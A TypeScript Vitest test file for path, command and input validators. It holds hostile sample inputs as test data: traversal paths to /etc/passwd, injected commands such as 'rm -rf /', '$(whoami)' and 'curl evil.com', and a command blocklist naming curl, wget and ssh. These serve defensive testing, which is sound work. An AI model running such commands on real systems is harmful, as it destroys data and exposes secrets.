import { describe, it, expect, beforeEach, vi } from 'vitest';
import { PathValidator } from '@/services/security/PathValidator';
import { CommandGuard } from '@/services/security/CommandGuard';
import { InputSanitizer } from '@/services/security/InputSanitizer';
import { PathError } from '@/lib/errors/ToolError';
import { CommandDeniedError } from '@/lib/errors/ToolError';

// ─── PathValidator ────────────────────────────────────────────────────────────

describe('PathValidator', () => {
  const HOME = process.env['HOME'] ?? '/home';

  it('accepts a valid path inside HOME', () => {
    const result = PathValidator.validate(`${HOME}/Documents/file.txt`);
    expect(result).toBe(`${HOME}/Documents/file.txt`);
  });

  it('accepts /tmp paths', () => {
    expect(() => PathValidator.validate('/tmp/test')).not.toThrow();
  });

  it('blocks path traversal with ../', () => {
    expect(() => PathValidator.validate(`${HOME}/../../etc/passwd`)).toThrow(PathError);
  });

  it('blocks absolute paths outside allowed bases', () => {
    expect(() => PathValidator.validate('/etc/passwd')).toThrow(PathError);
    expect(() => PathValidator.validate('/root/secret')).toThrow(PathError);
    expect(() => PathValidator.validate('/sys/kernel')).toThrow(PathError);
  });

  it('blocks paths with null bytes', () => {
    expect(() => PathValidator.validate(`${HOME}/file\0.txt`)).toThrow(PathError);
  });

  it('blocks empty string', () => {
    expect(() => PathValidator.validate('')).toThrow(PathError);
  });

  it('detects traversal attempts', () => {
    expect(PathValidator.isTraversalAttempt('../secret')).toBe(true);
    expect(PathValidator.isTraversalAttempt('..\\windows')).toBe(true);
    expect(PathValidator.isTraversalAttempt('..')).toBe(true);
    expect(PathValidator.isTraversalAttempt('Documents/file.txt')).toBe(false);
  });
});

// ─── CommandGuard ─────────────────────────────────────────────────────────────

describe('CommandGuard', () => {
  it('allows whitelisted commands', () => {
    expect(() => CommandGuard.validateCommand('ls')).not.toThrow();
    expect(() => CommandGuard.validateCommand('pwd')).not.toThrow();
    expect(() => CommandGuard.validateCommand('cat')).not.toThrow();
    expect(() => CommandGuard.validateCommand('mkdir')).not.toThrow();
    expect(() => CommandGuard.validateCommand('touch')).not.toThrow();
    expect(() => CommandGuard.validateCommand('mv')).not.toThrow();
    expect(() => CommandGuard.validateCommand('cp')).not.toThrow();
  });

  it('blocks blacklisted commands', () => {
    const blocked = ['sudo', 'rm', 'chmod', 'chown', 'curl', 'wget', 'ssh', 'shutdown', 'reboot', 'kill'];
    for (const cmd of blocked) {
      expect(() => CommandGuard.validateCommand(cmd)).toThrow(CommandDeniedError);
    }
  });

  it('blocks unknown commands not in whitelist', () => {
    expect(() => CommandGuard.validateCommand('python')).toThrow(CommandDeniedError);
    expect(() => CommandGuard.validateCommand('node')).toThrow(CommandDeniedError);
    expect(() => CommandGuard.validateCommand('bash')).toThrow(CommandDeniedError);
    expect(() => CommandGuard.validateCommand('unknown-cmd')).toThrow(CommandDeniedError);
  });

  it('blocks shell injection patterns in arguments', () => {
    expect(() => CommandGuard.validateArgument('file; rm -rf /', 'ls')).toThrow(CommandDeniedError);
    expect(() => CommandGuard.validateArgument('file | cat /etc/passwd', 'cat')).toThrow(CommandDeniedError);
    expect(() => CommandGuard.validateArgument('$(whoami)', 'ls')).toThrow(CommandDeniedError);
    expect(() => CommandGuard.validateArgument('file && curl evil.com', 'ls')).toThrow(CommandDeniedError);
    expect(() => CommandGuard.validateArgument('`id`', 'cat')).toThrow(CommandDeniedError);
  });

  it('accepts clean arguments', () => {
    expect(() => CommandGuard.validateArgument('my-file.txt', 'cat')).not.toThrow();
    expect(() => CommandGuard.validateArgument('Documents', 'ls')).not.toThrow();
  });
});

// ─── InputSanitizer ───────────────────────────────────────────────────────────

describe('InputSanitizer', () => {
  it('identifies safe inputs', () => {
    expect(InputSanitizer.isSafe('my-file.txt')).toBe(true);
    expect(InputSanitizer.isSafe('Documents/report.pdf')).toBe(true);
  });

  it('flags dangerous inputs', () => {
    expect(InputSanitizer.isSafe('file; rm -rf /')).toBe(false);
    expect(InputSanitizer.isSafe('file | cat /etc/passwd')).toBe(false);
    expect(InputSanitizer.isSafe('$(whoami)')).toBe(false);
  });

  it('strips null bytes and trims whitespace', () => {
    expect(InputSanitizer.sanitize('  hello\0world  ')).toBe('helloworld');
    expect(InputSanitizer.sanitize('\0\0file.txt\0')).toBe('file.txt');
  });

  it('escapes single quotes in shell args', () => {
    const result = InputSanitizer.escapeShellArg("it's a file");
    expect(result).toBe("'it'\\''s a file'");
  });

  it('assertSafe throws on dangerous input', () => {
    expect(() => InputSanitizer.assertSafe('file; rm -rf /', 'path')).toThrow(PathError);
    expect(() => InputSanitizer.assertSafe('clean-file.txt', 'path')).not.toThrow();
  });
});
